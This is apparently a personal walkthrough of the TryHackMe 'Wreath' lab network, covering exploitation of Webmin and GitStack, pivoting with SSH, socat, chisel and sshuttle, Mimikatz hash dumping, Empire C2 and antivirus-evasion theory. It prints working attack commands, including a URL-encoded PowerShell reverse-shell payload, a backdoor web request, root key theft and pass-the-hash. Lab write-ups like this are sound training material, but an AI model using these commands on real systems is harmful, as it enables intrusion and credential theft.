
# Wreath Room

Link to the room : https://tryhackme.com/room/wreath

My IP address : 10.50.156.24

Target IP addresses : 10.200.159.200 -> 10.200.159.150 -> 10.200.159.100

My OS : Kali GNU/Linux 2021.2

# Table of Contents
1. [Enumeration](#enumeration)
2. [Checking services](#checking-services)
3. [Pivoting part 1](#pivoting)
    1. [Proxychains](#proxy-tool-1-proxychains)
    2. [FoxyProxy](#proxy-tool-2-foxyproxy)
    3. [Forwarding connections](#forwarding-connections)
    4. [Reverse connections](#reverse-connections)
    5. [SSH](#windows-command-line-ssh)
    6. [Socat](#socat)
    7. [Chisel](#chisel)
    8. [Sshuttle](#sshuttle)
4. [Enumeration before pivoting](#enumerating-before-pivoting)
5. [Pivoting part 2](#pivoting-continued)
6. [Post exploitation Windows](#post-exploitation-of-windows-machine)
7. [Command and Control Empire](#command-and-control---empire-tool)
8. [Getting agent back from the Git Server](#getting-agent-back-from-the-git-server)
9. [Enumeration of the last machine](#enumeration-of-the-last-machine)
10. [Antivirus Evasion](#antivirus-evasion)
11. [Last Machine](#the-last-machine)
    1. [Finding vulnerability](#finding-vulnerabilities)
    2. [Exploiting vulnerability](#exploiting-vulnerability)
    3. [Bypassing the antivirus](#bypassing-the-antivirus)
    4. [Full reverse shell access](#full-reverse-shell)
    5. [Enumeration from inside](#enumeration-from-inside)
    6. [Privilege escalation](#privilege-escalation)

## Gathered information about the network :

- There are three machines on the network, where at least one has public facing webserver turned on
- There is internal git server that is self-hosted somewhere in the network
- One of the machines has antivirus installes so we can assume this is Windows machine and we cannot acces it directly from the webserver

## Enumeration

First off we need to enumerate our target. There is only one IP provided for us (10.200.159.200) so we will start with this one.
```
sudo nmap -sSVC -p- 10.200.159.200

PORT    STATE   SERVICE and VERSION
22      open    ssh OpenSSH 8.0
80      open    http Apache 2.4.37 (centos)
443     open    ssl/http Apache 2.4.37 (centos)
9090    open    zeus-admin (probably not relevant)
10000   open    MiniServ 1.89 (webmin)
```
After that I usually scan the target again, with other parameters, to make sure that we didn't miss anything. For example :
```
sudo nmap -sV -p- -A -O 10.200.159.200 
```
We can't see any new services/ports but because of the -O parameter we get the 89% agressive OS guess that this machine is running Linux (we were able to retrieve this information
before from 80/443 port scan.

## Checking services

  ### HTTP
  
  After the enumeration we can check all of the available services. For example you can connect to the ssh `ssh root@10.200.159.200` and check if there is any banner shown.
  Next up we need to check the webpage. When we try to enter we are redirected to https://thomaswreath.thm/. As we can see there is no DNS that will resolve this for us. 
  To get access we need to edit our /etc/hosts file.
  ```
  10.200.159.200    thomaswreath.thm
  ```
  With that out of our way we are able to get access to this webpage where we are welcomed with resume website of Thomas Wreath.
  In real life penetration test you should "footprint" this person. That's what we will try to do but on a much lower scale. First up I will find everything that can be useful
  in the future that is on this website.
  1. Thomas' mobile phone number and phone number : +447821548812 and 01347 822945
  2. Thomas' address : 21 Highland Court in Yorkshire, England
  3. His mail : me@thomaswreath.thm

  Next up we can see that the page was done with the help of Online CV design by ThemeHippo. Sometimes it is useful information, for example when the site
  is made with wordpress.
  Normally we should enumerate this page with dirb/dirbuster/gobuster and maybe directory-list-2.3-medium.txt but for now we'll move on to the next service.
  
  ### Webmin HTTP
  
  We can start with checking if this version of the webmin is vulnerable to any exploit. Quick search with google gives us information that we wanted.
  On https://github.com/MuirlandOracle/ you are able to find the CVE-2019-15107 exploit that gives us unauthorized Remote Command Execution on this machine. 
  You can simply clone it onto your machine and install all of the requirements to run this exploit.
  ```
  git clone https://github.com/MuirlandOracle/CVE-2019-15107
  pip3 install -r requirements.txt
  chmod +x CVE-2019-15107.py
  ```
  After all of the requirements are satisfied we are able to obtain a reverse shell to the target machine.
  ```
  ./CVE-2019-15107.py 10.200.159.200
  ```
  Luckily this webserver is running as a root so we don't have to escalate our privileges! But still we have to stabilise our shell.
  There is this functionality to obtain a stable reverse shell with this CVE but I wasn't able to do it (couldn't type in my IP address and port where my netcat was listening)
  so I read the /.ssh/id_rsa file of root and connected through ssh to stabilise my shell.
  ```
  cat /root/.ssh/id_rsa
  nano id_rsa
  chmod 600 id_rsa
  ssh -i id_rsa root@10.200.159.200
  ```
  
## Pivoting

Right now we are inside of first machine but we need to keep going and keep enumerating so we can start pivoting. Pivoting is the art of using access obtained over one machine
to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing. There are two main methods of pivoting :
- Tunnelling/Proxying - Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially
also be tunnelled inside another protocol (e.g. SSH tunnelling) which can be useful for evading a basic IDS or firewall.
- Port Forwarding - Creating a connection between a local port and a single port on a target via compromised host.

Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed.

  ---

  ### Theory behind pivoting

  You can skip that part if you want to see only practical solutions for this room.
  Things that I'll focus on :
  - Proxy tools
  - Port forwarding methods
  - Stable linux shell with socat
  - Chisel as your proxy/port forwarding tool
  - sshuttle as your tunnelled proxy

  ### Proxy tool 1 Proxychains
  
  Proxychains is a command line tool which is activated by prepending the command _proxychains_ to other commands. For example to proxy netcat it would look like this :
  ```
  proxychains nc 10.200.159.200 22
  ```
  The proxy port was not specified in the above command because proxychains reads its options from a config file (/etc/proxychains.conf). If you want to configure proxychains
  for a specific assignment you can copy this config file and make any changes in a copy stored in your current directory.
  
  One of the things to note when scanning through proxychains is that you can only use TCP scans. Because of that if you want to proxy nmap through proxychains you should always
  enable the -Pn switch to prevent from issuing ICMP echo requests.
  
  ### Proxy tool 2 FoxyProxy
  
  This is an extension to your browser that you are probably already familiar with because a lot of pentesters use this tool to manage their BurpSuite/ZAP proxy quickly and
  easily. There is not much to say about this extension because it's really easy to use and manage.
  
  ### Forwarding connections
  
  Creating a forward SSH tunnel can be done if we have SSH access to the target machine. Port forwarding is accomplished with the -L switch which creates a link to a Local port.
  ```
  ssh -L 8000:10.200.159.200:80 user@10.200.159.200 -fN
  ```
  After execution we are able to get access to the default webpage of host 10.200.159.200 on http://127.0.0.1:8000/. The -fN switch backgrounds the shell immediately so that we 
  have our own terminal back and tells SSH that it doesn't need to execute any commands - only set up the connection. 
  
  Proxies are made using the -D switch. This is useful when combined with a tool such as proxychains.
  ```
  ssh -D 1336 user@10.200.159.200 -fN
  ```
  Having this proxy set up would allow us to route all of our traffic through into the target network.
  
  ### Reverse Connections
  
  These are riskier as you must access your attacking machine from the target - by using credentials or preferably key based system.
  First you need to generate a new set of SSH keys and store them somewhere safe `ssh-keygen`. Then you need to edit the /.ssh/authorized_keys file on your own
  attacking machine by adding :
  ```
  command="echo 'This account can only be used for port forwarding'",no-agen-forwarding,no-x11-forwarding,no-pty ssh-rsa <your public RSA key> 
  ```
  And finally you need to check the SSH service `sudo systemctl status ssh`. If it is up you can safely transfer your private key and proceed to setting up reverse connection.
  ```
  ssh -R <LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<ATTACKING IP> -i id_rsa -fN
  ```
  To close any of these connections type `ps aux` and then `sudo kill PID`.
  
  ### Windows command line SSH
  
  Plink.exe is a tool that mimics the PuTTY SSH client in command line. The syntax of commands is really similar to linux SSH commands. 
  For example this is syntax to create a reverse connection :
  ```
  cmd.exe /c echo y | .\plink.exe -R <LOCAL PORT>:<TARGET IP>:<TARGET PORT> <USERNAME>@<ATTACKING IP> -i id_rsa -N
  ```
  The `cmd.exe /c echo y` at the start is for non-interactive shells. Good thing to know is that keys generated by ssh-keygen will not work properly here.
  You will need to convert them using puttygen tool. 
  
  ### Socat
  
  With this tool every pentester should be familiar already. It's not just great for fully stable Linux shells, it's also superb for port forwarding.
  The biggest disadventage of socat is that it is very rarely installed by default on a target. But luckily you can easily find static binaries
  for both Windows and Linux. It's best to think of socat as a way to join two things together - kind of like the Portal gun. This could be two ports on the same machine, 
  it could be to create a connection between two different machines etc. 
  
  
  1. Reverse Shell Relay


      Attacker machine :
      ```
      sudo nc -lnvp 445
      ```
      Target machine :
      ```
      socat tcp-l:8000 tcp:<ATTACKING IP>:445 &
      ```
      In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. The ampersand & symbol at the end backgrounds
      this particular job.
  
  
  2. Port forwarding


      Target machine :
      ```
      socat tcp-l:<PORT TO RECEIVE>,fork,reuseaddr tcp:<TARGET IP>:<TARGET PORT> &
      ```
      Upon the execution we can connect to <PORT TO RECEIVE> and have our connection directly relayed to our intended target.

      To kill any of the jobs you created you need to simply find it in `jobs` and then `kill %<NUMBER OF THE JOB>`.

  ### Chisel
  
  It's an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH
  access or not. To work you must have an appropriate copy of the chisel binary on both the attacking machine and the compromised server. 
  
  
  1. Reverse SOCKS Proxy
  
  
      Attacker machine :
      ```
      chisel server -p <LISTEN PORT> --reverse &
      ```
      Target machine :
      ```
      chisel client <ATTACKING IP>:<LISTEN PORT> R:socks &
      ```
      This command connects back to the waiting listener on our attacking machine, completing the proxy. 
  
  
  2. Forward SOCKS Proxy
  
  
      Target machine :
      ```
      chisel server -p <LISTEN PORT> --socks5
      ```
      Attacker machine : 
      ```
      chisel client <TARGET IP>:<LISTEN PORT> <PROXY PORT>:socks
      ```
      In this command PROXY PORT is the port that will be opened for the proxy.

      ***Reminder*** 
      When sending data through either of these proxies we would need to est the port in our proxychains configuration. As chisel uses SOCKS5 proxy, we will also need
      to change the start of the line from socks4 to socks5.
  
  
  3. Remote Port Forward
  
  
      Attacker machine command is exact the same as with the Reverse SOCKS Proxy to setup a chisel listener to connect back to.
  
      Target machine :
      ```
      chisel client <ATTACKING IP>:<LISTEN PORT> R:<LOCAL PORT>:<TARGET IP>:<TARGET PORT> &
      ```
  
  
  4. Local Port Forward
  
  
      As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a target.
  
      Target machine :
      ```
      chisel server -p <LISTEN PORT>
      ```
      Attacker machine :
      ```
      chisel client <LISTEN IP>:<LISTEN PORT> <LOCAL PORT>:<TARGET IP>:<TARGET PORT>
      ```
  
  ### Sshuttle
  
  This tool is quite different because it doesn't perform a port forward, and the proxy it creates is nothing like the onew we have already seen.
  Instead it uses an SSH connection to create a tunnelled proxy that acts like a new interface. It simulates a VPN, allowing us to route our traffic through the proxy
  without the use of proxychains. We can just directly connect to devices in the target network as we would normally connect to networked devices. we use sshuttle entirely
  on our attacking machine, in much the same way we would SSH into a remote server. But there are some drawbacks. For a start sshuttle only works on Linux targets, it also
  requires access to the target machine via SSH and the target machine must have python installed. 
  Sshuttle installing :
  ```
  sudo apt install sshuttle
  ```
  Base command for connecting to a server with sshuttle :
  ```
  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP>
  ```
  But what happens if we don't have the user's password, or the server only accepts key-based authentication? Sshuttle doesn't currently seem to have a shorthand for specifying 
  a private key to authenticate to the server with. Because of that we use `--ssh-cmd` switch that allows us to specify what command gets executed by sshuttle.
  ```
  sshuttle -r <USERNAME>@<TARGET IP> --ssh-cmd "ssh -i <KEY FILE>" <TARGET SUBNET IP>
  ```
  If we are connecting to the target machine and this target machine is part of the subnet we're attempting to gain access to we can stumble upon error code 255 or
  "Broken pipe". To get around this we tell sshuttle to exclude the compromised server from the subnet range using the `-x` switch.
  ```
  sshuttle -r <USERNAME>@<TARGET IP> <TARGET SUBNET IP> -x <TARGET IP>
  ```
  
  ---

## Enumerating before pivoting

Information is power - our first step when attempting to pivot through a network is to get an idea of what's around us. Ideally we want to take advantage of pre-installed
tools on the system to enumerate a network through a compromised host. This is called Living off the Land (LotL) - a good way to minimise risk.
```
ifconfig
arp -a
cat /etc/hosts
cat /etc/resolv.conf
```
Next up we will download a static nmap binary on our attacker machine and download it using python server and `curl` to our target machine. 
```
sudo python3 -m http.server 80
curl <ATTACKER IP>/nmap -o /tmp/nmap && chmod +x /tmp/nmap
```
With that binary we can scan the network from target machine. We should get some interesting hosts and services.
```
./nmap -sn 10.200.159.1-255 -oN scan.txt
```
If you don't already know `-sn` switch is used to tell nmap not to scan any port and instead just determine which hosts are alive. We can do the same with `fping`.
After that we can focus only on those hosts that are alive instead of scanning the whole network and all ports. It would be waste of our time.
```
Nmap scan report for ip-10-200-159-1.eu-west-1.compute.internal (10.200.159.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.18s latency).
MAC Address: 02:98:7F:EB:16:FB (Unknown)
Nmap scan report for ip-10-200-159-100.eu-west-1.compute.internal (10.200.159.100)
Host is up (0.00016s latency).
MAC Address: 02:81:EA:BC:A8:2F (Unknown)
Nmap scan report for ip-10-200-159-150.eu-west-1.compute.internal (10.200.159.150)
Host is up (0.00012s latency).
MAC Address: 02:DC:AC:DE:3C:C3 (Unknown)
Nmap scan report for ip-10-200-159-250.eu-west-1.compute.internal (10.200.159.250)
Host is up (0.00017s latency).
MAC Address: 02:B9:77:CE:A4:C7 (Unknown)
Nmap scan report for ip-10-200-159-200.eu-west-1.compute.internal (10.200.159.200)
Host is up.
```
If we exclude our host and those hosts that are not in-scope we get two alive hosts - 10.200.159.100 and 10.200.159.150.
```
nmap -p- 10.200.159.100,150

10.200.159.150
PORT  STATE   SERVICE
80    open    http 
3389  open    ms-wbt-server
5985  open    wsman

10.200.159.100
We can assume that this host is not accessible from our current position in the network because all of the ports are filtered.
```
Without proxy we cannot perform a service detection scan on the target so we will assume that those identified services are accurate. It seems that the most vulnerable service 
is the http on port 80.

## Pivoting continued

Right now we have to get access to the 10.200.159.150:80 machine using our root access on 10.200.159.200 machine. We can do that by simply creating an SSH connection between 
our 10.50.156.24:8000 -> 10.200.159.200 -> 10.200.159.150:80.
```
ssh -i id_rsa -L 8000:10.200.159.150:80 root@10.200.159.200 -fN
```
When we visit our http://127.0.0.1/8000 web page we can see that default webpage was not found so we should try 3 other URLs. One of them is /gitstack which is working.
As default credentials (admin:admin) doesn't work on this site we should look for any vulnerability in databases like https://www.exploit-db.com/ or searchsploit.
What I found out is that there is a vulnerability in exploit-db without given CVE named "GitStack 2.3.10 - RCE". Let's try to use it.

First of all we need to download it onto our attacker machine. We can copy it or git clone the entire directory, I prefer the first solution. Next up we should look through 
the code to understand how it works and edit parameters like "ip" or "command". For my configuration it shoud look like this :
```
ip = '127.0.0.1:8000'
command = 'whoami'
```
The command stays as it is because we want to know if this vulnerability even works. After those changes we can run this exploit with `python2 ./<NAME>` and get the output 
`nt authority\system` which is really good for us because we don't have to escalate our privileges on this machine. From here we want to obtain a full reverse shell. 
Another excelent fact is that this first run of the exploit creates a backdoor for us which we can use later for creating a reverse shell. Backdoor by default is in 
http://127.0.0.1:8000/web/exploit.php and it uses "a=" parameter for commands. For example right now you can accomplish the same output with :
```
curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=whoami"
```
  
  ### Windows Reverse Shell
  
  Before we go for a reverse shell, we need to establish whether or not this target is allowed to connect to the outside world. Typical way to do this is to send some ICMP echo 
  requests to our attacker machine and see how many make it through the network. Let's start with the listener on our attacker machine :
  ```
  tcpdump -i <INTERFACE> icmp
  ```
  And try to ping it with :
  ```
  ping -n 3 <ATTACKING IP>
  ```
  As we can see we have no output at all. To work around it we have to either upload a static copy of netcat and just catch the shell here or set up a relay on .200 to forward 
  a shell back to a listener. I will choose first option. Ready binary you can find on anrew-d' github. But before we can do any work with netcat we have to get rid of CentOS 
  always-on wrapper around the IPTables firewall called "firewalld". By default this firewall is extremely restrictive and because of that we need to open our desired port in 
  the firewall.
  ```
  firewall-cmd --zone=public --add-port 20000/tcp
  ```
  After that we can upload to our root machine netcat binary and start listening on port 20000. On attacker machine we have to make curl/BurpSuite POST method with parameter "a" 
  set as our one-liner reverse powershell. You can get those one-liners on various of githubs (you have to know how to search!).
  
  If you want to use curl you need to encode this one-liner to URL standards. You can do this with https://urlencoder.org/. 
  ```
  curl -X POST http://127.0.0.1:8000/web/exploit.php -d "a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.159.200%27%2C20000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22%0A"
  ```
  
  And just like this we got our powershell reverse shell. Easy, right?
  
## Post-exploitation of Windows Machine

From the enumeration we know that ports 3389 and 5985 are open. This means that we should be able to obtain either a GUI through RDP (3389) or a stable CLI shell using WINRM 
(5985). Specifically we need a user account with the "Remote Desktop Users" group for RDP or the "Remote Management Users" group for WinRM. We already have the ultimate 
access so we can easily create such an accounts. 
```
net user <USERNAME> <PASSWORD> /add
net localgroup Administrators <USERNAME> /add
net localgroup "Remote Management Users" <USERNAME> /add
```
With that out of our way we can access this machine with evil-winrm or xfree-rdp.
```
sudo gem install evil-winrm
ssh -i id_rsa -L 8001:10.200.86.150:5985 root@10.200.159.200 -fN
evil-winrm -u <USERNAME> -p <PASSWORD> -i 127.0.0.1 -P 8001
```
If it comes to xfreerdp we are able to create a shared drive between the attacking machine and the target. We can do this with switch `/drive:`. A useful directory to share is 
the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools including Mimikatz.
```
ssh -i id_rsa -L 8002:10.200.86.150:3389 root@10.200.159.200 -fN
xfreerdp /v:127.0.0.1:8002 /u:<USERNAME> /p:<PASSWORD> /drive:/usr/share/windows-resources,share
```
  
  ### Mimikatz
  
  With the shared Kali directory we are able to run Mimikatz from our cmd/powershell on xfreerdp setup. This gives us access to a very big database of post-exploitation tools 
  that we can use to e.g. dump all the hashes.
  ```
  \\tsclient\share\mimikatz\x64\mimikatz.exe
  privilege::debug
  token::elevate
  ```
  If your command line is running as Administrator everything should go swiftly. Next up you should dump all of the SAM local password hashes using `lsadump::sam`. Near the top 
  of the results you will se the Administrator's NTLM hash. We are not able to crack it but we can always try to crack other users passwords. For example Thomas' password is 
  really easy to crack and you can even use sites like https://crackstation.net/.
  
  As we were not able to crack the Administrators hash we can use it with evil-winrm built-in pass-the-hash technique using this hash to get Administrator access.
  ```
  evil-winrm -u Administrator -H <hash> -i 127.0.0.1 -P 8001
  ```
  Just like this we were able to establish a stable shell.
  
## Command and Control - Empire tool

What after getting the stable shell? With a foothold in a target network, we can start looking to bring what is known as a *C2 (Command and Control) Framework* into play. C2 
Frameworks are used to consolidate an attacker's position within a network and simplify post-exploitation steps (privesc, AV evasion, pivoting, looting etc.), as well as 
providing red teams with extensive collaboration features. There are many C2 Frameworks available but the most famous is likely *Cobal Strike*. An excellence resource for 
finding C2 frameworks is The C2 Matrix. 
  
In this room we are introduced to a C2 framework named *Empire*. Powershell Empire is a framework built primarily to attack Windows targets. It provides a wide range of modules 
to take initial access to a network of devices and turn it into something much bigger. 
  
Installation process :
```
sudo apt install powershell-empire
sudo powershell-empire server
```
The second command is used to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller (GUI extension of 
Empire).
  
With the server started you can get the Empire CLI Client working using `poewrshell-empire client`. 
  
Powershell Empire has several major sections to it :
  - Listeners - they listen for a connection and faciliate further exploitation
  - Stagers - essentially payloads generated by Empire to create a robust reverse shell in conjunction with a listener. 
  - Agents - are the equivalent of a Metasploit "Session". They are connections to compromised targets, and allow an attacker to further interact with the system.
  - Modules - used in conjuction with agents to perform further exploitation. For example they can work through an existing agent to dump the password hashes from the server.
    
  ---
  
  ****Listeners**** in empire are used to receive connections from stagers. The default listener is the HTTP listener. To select a listener we would use the `uselistener` 
  command. To see all available listeners type `uselistener `  which will bring up a dropdown menu of available listeners. When you've picked a listener, type `uselistener 
  <LISTENER>` and press enter to select it. After selecting `uselistener http` we will be welcomed with a huge table of options for this listener. If we want to see an updated
  copy of this table we can access it again with the `options` command.

  The syntax for setting options is identical to the Metasploit module options syntax - `set <OPTION> <VALUE>`. That said some uptions _must_ be set :
  ```
  set NAME CLIHTTP
  set Host 10.50.156.24
  set Port 8000
  ```
  With the required options set we can start the listener with `execute`. We can then exit out of this menu using `back` or exit to the main menu with `main`.

  **Hop listeners** create what looks like a regular listener in our list of listeners; however, rather than opening a port to receive a connection, hop listeners create files
  to be copied across to the compromised "jump" server and server from there. These files cotain instructions to connect back to a normal listener on our attacking machine. 
  The hop listener that we will be working with is the most common kind: the _http_hop_ listener. When created this will create a set of .php files wihch must be uploaded to the 
  jumpserver and server by a HTTP server. 
  ```
  uselistener http_hop
  options
  set RedirectListener CLIHTTP
  set Host 10.200.159.200
  set Port 49000
  options
  execute
  ```
  In this listener our `Host` is a compromised server (10.200.159.200 with my setup). 
  
  ---
  
  ****Stagers**** are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed. We can generate stagers in Empire CLI. In most
  cases these 
  will be given as script files to be uploaded to the target and executed (just like with metasploit). To start generating stagers in the Empire CLI application you need to 
  execute `usestager ` from the main Empire prompt to get a list of available stagers in a dropdown menu. There are variety of options there. When in doubt `multi/launcher` is 
  often a good bet. In this case let's go for `multi/bash`.
  As with listeners we set options with `set <OPTION> <VALUE>`. The only thing that we need to do is set the listener to the name of the listener we created in the previous 
  task.
  ```
  usestager multi/bash
  set Listener CLIHTTP
  execute
  ```
  This will generate the stager in our /tmp directory. We now need to get the stager to the target and execute it. For now we can save this file and exit out of the stager menu 
  with `back`.
  
  ---
    
  As mentioned previously ****modules**** are used to perform various tasks on a compromised target, through an active Empire agent. For example we could use Mimikatz through 
  its Empire module to dump various secrets from the target. Inside the context of an agent, type `usemodule`. As expected this will show a dropdown with a huge list of modules 
  which can be loaded into the agent for execution. For example we can try to load `Sherlock Empire` module that checks for potential privilege escalation vectors on the target.
  ```
  usemodule powershell/privesc/sherlock
  options
  execute
  ```
  After a while you will get the results from this script.
    
  ---
  
  Now that we've started a listener and created a stager, it's time to put them together to get an ****agent****. The process for this is as easy as getting the file to the 
  target and executing it (using hop-listener). This results in an agent being received by our waiting listener. In the Empire CLI we will notice that we got the connection but 
  we have to select correct agent by typing in `agents` and `interact <AGENT NAME>`. 
  
  When we are in agent-view we can get the full list of available commands with `help`. When we have finished with out agent we use `back` but this doesn't destroy the agent. 
  If we did want to kill our agent we would do it with `kill <AGENT NAME>`. You can also rename agents using `rename <AGENT NAME> <NEW AGENT NAME>`.
  
  ---
 
## Getting agent back from the Git Server
  
  You should already havy a http_hop listener started. Now we must generate an appropriate stager for the target and put the http_hop files into position on 10.200.159.200 
  machine and start a webserver to serve the files on the port we selected during the listener creation. This server must be able to execute PHP. 
  
  We need to generate a new payload (not the one we generated just to see how it works) because we have a new listener - http_hop that we have to specify.
  ```
  usestager multi/launcher
  set Listener http_hop
  execute
  ```
  This way we get the reverse-shell payload to copy-paste. Next up we have to get that jumpserver set up. We start with creating /tmp/hop directory and transfering the content 
  of /tmp/http_hop directory across to this directory on the target server. Good way is to zip these files and transfer them using python server. 
  ```
  Attacking machine :
  cd /tmp/http_hop && sudo zip -r hop.zip *
  
  Root machine :
  curl 10.50.156.24/hop.zip -o hop.zip
  unzip hop.zip
  ```
  Then we need to actually serve the files on the port we chose when generating the http_hop listener (49000). Fortunately we already know that this server has PHP installed 
  as it serves as the backend to the main website. This means that we can use the PHP development webserver to serve our files.
  ```
  php -S 0.0.0.0:49000 &>/dev/null &
  ```
  *Remember* to open up the port in the firewall.
    
  After all this we can finally use "a" parameter with `curl` command that we used a while ago when establishing a connection with 10.200.159.200 host and get our reverse-shell. 
  Command that we need to execute is our powershell payload generated by Empire. Remember to URL-encode it.
    
## Enumeration of the last machine
    
  We already know that this target is likely to be the other Windows machine on the network. By process of elimination we can tell that this is Thomas' PC which he told us has 
  antivirus software installed. As always we need to enumerate the target before we can do anything else. For the sake of learning let's upload the Empire Port Scanning script 
  and execute it manually on the target. 
    
  Uploading tools (using metasploit/evil-winrm/python webserver) is all well and good but if the tool happens to be a PowerShell script then there is another method. If you 
  check the help menu for evil-winrm you will se an `-s` option that allows us to specify a local directory cotaining powershell scripts -- these scripts will be made 
  accessible for us to import directly into memory using our evil-winrm session (meaning they don't need to touch the disk at all). For example if we have our scripts located at 
  /opt/scripts we could include them in the connection with :
  ```
  evil-winrm -u <USERNAME> -p <PASSWORD> -i <IP> -s /opt/scripts
  ```
  We can use this option to include the Empire Port Scan module 
  ```
  evil-winrm -u Administrator -H HASH -i 10.200.159.200 -s /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/
  ```
  Then you just need to type `Invoke-Portscan.ps1` and press enter to initialise the script. Now if we type `Get-Help Invoke-Portscan` we should see the help menu for the tool 
  without having to import or upload anything manually.
  ```
  Invoke-Portscan -hosts 10.200.93.100 -topport 50
  
  Hostname : 10.200.93.100
  openPorts : {80,3389}
  ```
   
## Pivoting last part
    
  Now to access the development webserver on Wreath's PC from our attacking machine we have to options : Chisel or Plink. To use chisel you will need to open up a port in the 
  Windows firewall to allow the forward connections to be made. The syntax for opening a port using `netsh` looks like this :
  ```
  netsh advfirewall firewall add rule name="RULE" dir=in action=allow protocol=tcp locaport=49000
  ```
  Then we need to upload chisel using evil-winrm to the GitStack server and start chisel in server mode.
  ```
  ./chisel.exe server -p 49000 --socks5
  ```
  Switch back to attackers machine and run chisel in client mode to connect it to the server :
  ```
  ./chisel client 10.200.159.150:49000 9090:socks
  ```
  And the final step is to set up our proxy to proxy through 127.0.0.1:9090. With that enabled we can browse to the website hosted on the last PC. Using *Wappalyzer* we can 
  identify the server-side programming language, that is php 7.4.11.

## Antivirus Evasion
  By nature the AV Evasion is a rapidly changing topic. It's a constant dance between hackers and developers. Every time the developers release a new feature, the hackers 
  develop a way around it. Every time the hackers bypass a new feature, the developers release another feature to close off the exploit, and so the cycle continues. 
  When it comes to AV evasion we have two primary types available :
    - On-Disk evasion - When we try to get a file saved on the target, then executed. This is very common when working with executable files.
    - In-Memory evasion - When we try to import a script directly into memory and execute it there. 
    
  In therms of methodology : ideally speaking, we would start by attempting to fingerprint the AV on the target to get an idea of what solution we're up againts. As this is 
  often an interactive process, we will skip it for now and assume that the target is running the default Windows Defender so that we can get straight into the meat of the 
  topic. If we already have a shell on the target, we may also be able to use programs such as `SharpEDRChecker` and `Seatbelt` to identify the antivirus solution installed.
  Once we know the OS version and AV of the target we would then attempt to replicate this environment in a virtual machine which we can use to test payloads against. Once we 
  have a working payload we cen than deploy it against the target.
    
  ### Antivirus Detection Methods
    
  Generally speaking, detection methods can be classified into one of two categories :
    - Static Detection
    - Dynamic / Heuristic / Behavioural Detection
	
	*Static detection* methods usually involve some kind of signature detection. A very rudimetary system, for example, would be taking the hashsum of the suspicious file and 
	comparing it against a database of known malware hashsums. This system does tend to be used; however, it would never be used by itself in modern antivirus solutions. For this 
	reason it's usually a good idea to change _something_ when working with a known exploit. The smallest change to teh file will result in a completely different hashsum.
		
	Fortunately (or unfortunately for hackers) this is usually nowhere near enough to bypass static detection methods. The other form of static detection which is often used in 
	antivirus software is a technique called *Byte matching*. Byte matching is another form of signature detection which works by searching through the program looking to 
	match sequences of bytes against a known database of bad byte sequences. This is much more effective than just hashing the entire file. Of course it also means that we 
	have a much harder job tracking down the exact line of code responsible for the flag.
		
	*Dynamic methods* look at how the file _acts_. AV software can go through the executable line-by-line checking the flow of execution (basec on pre-defined rules about what 
	type of action is malicious) or the suspicious software can outright be executed inside a sandbox environment under close supervision from the AV software. If the program acts 
	maliciously then it is quarantined and flagged as malware.
		
	Evading these measures is still perfectly possible, although a lot harder than evading static detection techniques. Sandboxes tend to be relatively distinctive so we just need 
	to look for various system values (e.g. is there a fan installed, is there a GUI, any distinctive tools like VMtools) and check to see if there are any red flags. For example 
	a machine with no fan no GUI and a classic VM service is very likely to be sandbox -- in which case the program should just exit. Then the AV software is fooled into believing 
	that it's safe and allows it to be executed on the target.
	Equally the AV software is still only working with a set of rules to check malicious behaviour. If the malware acts in a way that is unexpected (e.g. random code that does 
	the grand sum of nothing) then it will likely pass this detection method.
		
## The last machine
    
### Finding vulnerabilities

Now we have access to Thomas website. We can just download the repository from the hard disk because we have local admin access to the git server. With our evil-winrm access 
we are able to locate absolute path to the website.git directory and use `download` command to download the whole directory. After 2 minutes your download should finish and 
a new directory should appear. Inside of it you should rename "Website.git" to ".git" because git repositories always contain a special directory called ".git". It contains 
all of the meta-information for the repository. This directory can be used to fully recreate a readable copy of the repository, including things like version control and 
branches. 

In order to extract the information from the repository we use a suite of tools called GitTools.
```
git clone https://github.com/internetwache/GitTools
```
The GitTools repository contains three tools :
- Dumper - can be used to download an exposed .git directory from a website
- Extractor - can be used to take a local .git directory and recreate the repository in readable format. This is designed to work in conjunction with the Dumper but will also 
work on the repo that we stole from the Git server.
- Finder - can be used to search the internet for sites with exposed .git directories. 

```
./extractor.sh <REPO DIR> <DESTINATION DIR>
```
The <REPO DIR> is the directory containing the .git directory for the repository. After this process we will have new files in specified <DESTINATION DIR> but those files 
(commits) are not sorted by date. It is up to us to piece together the order of the commits. Fortunately each of these commits comes with a `commit-meta.txt` file which we 
can read and get an idea of the order. Using `parent <HASH>` information we can get the full commit order :


1. Static Website Commit
2. Initial Commit for the back-end
3. Updated the filter


